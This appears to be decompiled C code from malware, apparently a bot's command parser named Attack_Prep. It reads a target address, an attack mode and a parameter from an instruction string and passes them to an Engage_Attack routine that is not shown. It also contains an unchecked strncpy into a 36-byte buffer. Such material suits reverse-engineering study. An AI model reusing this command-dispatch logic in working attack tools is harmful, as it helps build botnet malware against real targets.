byte Attack_Prep(char *instructions) {
  byte bVar1;
  longlong lVar2;
  char *local_60;
  char target_addr [36];
  long third_instruction;
  char *second_newline_offset;
  int attack_mode;
  char *location_of_second_newline;
  char *first_newline_offset_ptr;
  char *location_of_first_newline;
  
  location_of_first_newline = strchr(instructions,10);
  if (location_of_first_newline == (char *)0x0) {
    create_config_ini();
    bVar1 = 1;
  }
  else {
    strncpy(target_addr,instructions,(longlong)location_of_first_newline - (longlong)instructions);
    location_of_first_newline[(longlong)(target_addr + -(longlong)instructions)] = '\0';
    first_newline_offset_ptr = location_of_first_newline + 1;
    location_of_second_newline = strchr(first_newline_offset_ptr,10);
    if (location_of_second_newline == (char *)0x0) {
      create_config_ini();
      bVar1 = 1;
    }
    else {
      *location_of_second_newline = '\0';
      attack_mode = atoi(first_newline_offset_ptr);
      *location_of_second_newline = '\n';
      second_newline_offset = location_of_second_newline + 1;
      third_instruction = strtol(second_newline_offset,&local_60,10);
      if (second_newline_offset == local_60) {
        create_config_ini();
        bVar1 = 1;
      }
      else {
        lVar2 = Engage_Attack(target_addr,attack_mode,(longlong)third_instruction);
        bVar1 = (byte)lVar2 ^ 1;
        if (bVar1 != 0)
          bVar1 = 1;
      }
    }
  }
  return bVar1;
}
